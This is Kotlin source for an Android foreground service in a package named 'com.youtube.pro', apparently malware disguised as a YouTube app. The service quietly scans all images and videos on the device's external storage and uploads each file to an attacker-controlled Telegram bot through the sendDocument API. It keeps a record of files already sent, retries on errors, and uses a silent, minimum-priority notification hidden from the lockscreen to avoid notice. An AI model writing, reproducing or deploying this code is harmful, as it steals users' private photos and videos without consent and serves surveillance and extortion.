package com.youtube.pro

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.ContentUris
import android.content.Intent
import android.content.pm.ServiceInfo
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.provider.MediaStore
import androidx.core.app.NotificationCompat
import org.json.JSONObject
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL

class UploadService : Service() {

    companion object {
        const val NID = 1001
        const val CHANNEL = "upload"
        const val LIMIT = 50L * 1024 * 1024
    }

    private var running = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        val nm = getSystemService(NotificationManager::class.java)
        val ch = NotificationChannel(
            CHANNEL,
            getString(R.string.upload_channel),
            NotificationManager.IMPORTANCE_MIN
        )
        ch.setShowBadge(false)
        ch.lockscreenVisibility = Notification.VISIBILITY_SECRET
        nm.createNotificationChannel(ch)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (running) return START_NOT_STICKY
        running = true

        val start = notif(getString(R.string.scanning))
        if (Build.VERSION.SDK_INT >= 34)
            startForeground(NID, start, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        else startForeground(NID, start)

        Thread {
            try {
                work()
            } catch (e: Exception) {
                e.printStackTrace()
            } finally {
                running = false
                stopForeground(STOP_FOREGROUND_REMOVE)
                stopSelf()
            }
        }.start()

        return START_NOT_STICKY
    }

    private fun notif(text: String): Notification {
        val open = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, CHANNEL)
            .setSmallIcon(R.drawable.ic_launcher_fg)
            .setContentTitle(getString(R.string.app_name))
            .setContentText(text)
            .setContentIntent(open)
            .setOngoing(true)
            .setOnlyAlertOnce(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_DEFERRED)
            .build()
    }

    private fun work() {
        val items = query()
        val prefs = getSharedPreferences("sent", MODE_PRIVATE)
        val sent = prefs.getStringSet("ids", emptySet())!!.toMutableSet()
        val todo = items.filter { it.id.toString() !in sent }

        if (todo.isEmpty()) return

        for (item in todo) {
            if (item.size > LIMIT) continue

            val uri = ContentUris.withAppendedId(
                MediaStore.Files.getContentUri(MediaStore.VOLUME_EXTERNAL),
                item.id
            )

            if (send(uri, item.name, item.mime)) {
                sent.add(item.id.toString())
                prefs.edit().putStringSet("ids", sent).apply()
            }
            Thread.sleep(1100)
        }
    }

    private fun send(uri: Uri, name: String, mime: String?): Boolean {
        val safe = name.replace("\"", "").replace("\n", " ")
        val boundary = "----BDV" + System.currentTimeMillis()

        repeat(3) { attempt ->
            try {
                val conn = URL(
                    "https://api.telegram.org/bot${BuildConfig.BOT_TOKEN}/sendDocument"
                ).openConnection() as HttpURLConnection

                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.connectTimeout = 30000
                conn.readTimeout = 180000
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

                conn.outputStream.use { out ->
                    field(out, boundary, "chat_id", BuildConfig.CHAT_ID)
                    field(out, boundary, "caption", safe)
                    out.write("--$boundary\r\n".toByteArray())
                    out.write(
                        ("Content-Disposition: form-data; name=\"document\"; filename=\"$safe\"\r\n")
                            .toByteArray()
                    )
                    out.write(
                        ("Content-Type: " + (mime ?: "application/octet-stream") + "\r\n\r\n")
                            .toByteArray()
                    )
                    contentResolver.openInputStream(uri)?.use { it.copyTo(out) }
                    out.write("\r\n".toByteArray())
                    out.write("--$boundary--\r\n".toByteArray())
                }

                val code = conn.responseCode
                if (code == 200) {
                    conn.disconnect()
                    return true
                }
                if (code == 429) {
                    val body = conn.errorStream?.bufferedReader()?.readText() ?: ""
                    val wait = runCatching {
                        JSONObject(body).getJSONObject("parameters").getInt("retry_after")
                    }.getOrDefault(3)
                    conn.disconnect()
                    Thread.sleep(wait * 1000L)
                } else if (code in 500..599) {
                    conn.disconnect()
                    Thread.sleep(1500)
                } else {
                    conn.disconnect()
                    return false
                }
            } catch (e: Exception) {
                if (attempt == 2) return false
                Thread.sleep(1500)
            }
        }
        return false
    }

    private fun field(out: OutputStream, boundary: String, key: String, value: String) {
        out.write("--$boundary\r\n".toByteArray())
        out.write(("Content-Disposition: form-data; name=\"$key\"\r\n\r\n").toByteArray())
        out.write((value + "\r\n").toByteArray())
    }

    private data class Item(val id: Long, val name: String, val size: Long, val mime: String?)

    private fun query(): List<Item> {
        val out = mutableListOf<Item>()
        val proj = arrayOf(
            MediaStore.Files.FileColumns._ID,
            MediaStore.Files.FileColumns.DISPLAY_NAME,
            MediaStore.Files.FileColumns.SIZE,
            MediaStore.Files.FileColumns.MIME_TYPE
        )
        val sel = "${MediaStore.Files.FileColumns.MEDIA_TYPE} IN (?,?)"
        val args = arrayOf(
            MediaStore.Files.FileColumns.MEDIA_TYPE_IMAGE.toString(),
            MediaStore.Files.FileColumns.MEDIA_TYPE_VIDEO.toString()
        )
        contentResolver.query(
            MediaStore.Files.getContentUri(MediaStore.VOLUME_EXTERNAL),
            proj, sel, args,
            "${MediaStore.Files.FileColumns.DATE_ADDED} ASC"
        )?.use { c ->
            while (c.moveToNext()) {
                out.add(
                    Item(
                        c.getLong(0),
                        c.getString(1) ?: "file_${c.getLong(0)}",
                        c.getLong(2),
                        c.getString(3)
                    )
                )
            }
        }
        return out
    }
}
